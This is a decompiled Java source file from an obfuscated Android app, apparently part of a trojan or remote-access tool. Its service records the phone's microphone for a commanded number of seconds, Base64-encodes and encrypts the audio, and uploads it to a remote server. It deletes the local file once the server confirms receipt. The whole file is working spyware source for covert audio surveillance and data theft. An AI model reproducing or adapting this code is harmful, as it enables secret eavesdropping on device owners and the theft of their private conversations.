package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.util.Base64;
import android.util.Log;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;
import wocwvy.czyxoxmbauu.slsa.C0020b;

/* JADX INFO: loaded from: classes.dex */
public class cpysnikhf extends IntentService {

    /* JADX INFO: renamed from: a */
    boolean f534a;

    /* JADX INFO: renamed from: b */
    C0020b f535b;

    /* JADX INFO: renamed from: c */
    String f536c;

    public cpysnikhf() {
        super("cpysnikhf");
        this.f534a = false;
        this.f535b = new C0020b();
    }

    /* JADX INFO: renamed from: a */
    void m329a(final Context context, final String str, final String str2, final int i) {
        final MediaRecorder mediaRecorder = new MediaRecorder();
        Log.e("SOUND", "START RECORD SOUND");
        this.f534a = false;
        mediaRecorder.setAudioSource(1);
        mediaRecorder.setOutputFormat(3);
        mediaRecorder.setAudioEncoder(1);
        mediaRecorder.setOutputFile(str);
        Thread thread = new Thread(new Runnable() { // from class: wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.cpysnikhf.1
            @Override // java.lang.Runnable
            public void run() {
                C0020b c0020b;
                String str3;
                StringBuilder sb;
                try {
                    try {
                        Thread.sleep(i * 1000);
                        cpysnikhf.this.f535b.m230a("SOUND", "STOP RECORD SOUND");
                        try {
                            mediaRecorder.stop();
                            mediaRecorder.release();
                            cpysnikhf.this.f535b.m230a("FILE", "" + str);
                            C0020b c0020b2 = cpysnikhf.this.f535b;
                            String strEncodeToString = Base64.encodeToString(C0020b.m221a(new File(str)), 0);
                            C0020b c0020b3 = cpysnikhf.this.f535b;
                            C0020b c0020b4 = cpysnikhf.this.f535b;
                            Context context2 = context;
                            StringBuilder sb2 = new StringBuilder();
                            sb2.append("p=");
                            sb2.append(cpysnikhf.this.f535b.m242c(str2 + "||:||" + strEncodeToString));
                            String strM247d = c0020b3.m247d(c0020b4.m235b(context2, "13", sb2.toString()));
                            cpysnikhf.this.f535b.m230a("Запрос", " - > " + strM247d);
                            if (strM247d.equals("**good**")) {
                                new File(str).delete();
                            }
                            cpysnikhf.this.f535b.m250d(context, "startRecordSound", "stop");
                        } catch (Exception e) {
                            e = e;
                            cpysnikhf.this.f535b.m250d(context, "startRecordSound", "stop");
                            c0020b = cpysnikhf.this.f535b;
                            str3 = "ERROR";
                            sb = new StringBuilder();
                            sb.append("Record Sound! ");
                            sb.append(e);
                            c0020b.m230a(str3, sb.toString());
                        }
                    } catch (InterruptedException unused) {
                        cpysnikhf.this.f535b.m250d(context, "startRecordSound", "stop");
                        cpysnikhf.this.f535b.m230a("SOUND", "STOP RECORD SOUND");
                        try {
                            mediaRecorder.stop();
                            mediaRecorder.release();
                            cpysnikhf.this.f535b.m230a("FILE", "" + str);
                            C0020b c0020b5 = cpysnikhf.this.f535b;
                            String strEncodeToString2 = Base64.encodeToString(C0020b.m221a(new File(str)), 0);
                            C0020b c0020b6 = cpysnikhf.this.f535b;
                            C0020b c0020b7 = cpysnikhf.this.f535b;
                            Context context3 = context;
                            StringBuilder sb3 = new StringBuilder();
                            sb3.append("p=");
                            sb3.append(cpysnikhf.this.f535b.m242c(str2 + "||:||" + strEncodeToString2));
                            String strM247d2 = c0020b6.m247d(c0020b7.m235b(context3, "13", sb3.toString()));
                            cpysnikhf.this.f535b.m230a("Запрос", " - > " + strM247d2);
                            if (strM247d2.equals("**good**")) {
                                new File(str).delete();
                            }
                            cpysnikhf.this.f535b.m250d(context, "startRecordSound", "stop");
                        } catch (Exception e2) {
                            e = e2;
                            cpysnikhf.this.f535b.m250d(context, "startRecordSound", "stop");
                            c0020b = cpysnikhf.this.f535b;
                            str3 = "ERROR";
                            sb = new StringBuilder();
                            sb.append("Record Sound! ");
                            sb.append(e);
                            c0020b.m230a(str3, sb.toString());
                        }
                    }
                } catch (Throwable th) {
                    cpysnikhf.this.f535b.m230a("SOUND", "STOP RECORD SOUND");
                    try {
                        mediaRecorder.stop();
                        mediaRecorder.release();
                        cpysnikhf.this.f535b.m230a("FILE", "" + str);
                        C0020b c0020b8 = cpysnikhf.this.f535b;
                        String strEncodeToString3 = Base64.encodeToString(C0020b.m221a(new File(str)), 0);
                        C0020b c0020b9 = cpysnikhf.this.f535b;
                        C0020b c0020b10 = cpysnikhf.this.f535b;
                        Context context4 = context;
                        StringBuilder sb4 = new StringBuilder();
                        sb4.append("p=");
                        sb4.append(cpysnikhf.this.f535b.m242c(str2 + "||:||" + strEncodeToString3));
                        String strM247d3 = c0020b9.m247d(c0020b10.m235b(context4, "13", sb4.toString()));
                        cpysnikhf.this.f535b.m230a("Запрос", " - > " + strM247d3);
                        if (strM247d3.equals("**good**")) {
                            new File(str).delete();
                        }
                        cpysnikhf.this.f535b.m250d(context, "startRecordSound", "stop");
                        throw th;
                    } catch (Exception e3) {
                        e = e3;
                        cpysnikhf.this.f535b.m250d(context, "startRecordSound", "stop");
                        c0020b = cpysnikhf.this.f535b;
                        str3 = "ERROR";
                        sb = new StringBuilder();
                        sb.append("Record Sound! ");
                        sb.append(e);
                        c0020b.m230a(str3, sb.toString());
                    }
                }
            }
        });
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
            thread.start();
        } catch (IOException unused) {
        }
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        this.f535b.m250d(this, "startRecordSound", "start");
        try {
            int i = Integer.parseInt(intent.getStringExtra("time"));
            if (i > 0) {
                String str = "/RecordSound_" + new SimpleDateFormat("MM-dd-yyyy_HH:mm:ss", Locale.US).format(Calendar.getInstance().getTime()) + ".amr";
                this.f536c = getExternalFilesDir(null) + str;
                this.f535b.m230a("FILE REC", "" + this.f536c);
                this.f535b.m230a("Time", "" + i);
                m329a(this, this.f536c, str, i);
            }
        } catch (Exception e) {
            this.f535b.m250d(this, "startRecordSound", "stop");
            this.f535b.m230a("cpysnikhf", "ERROR" + e);
        }
    }
}
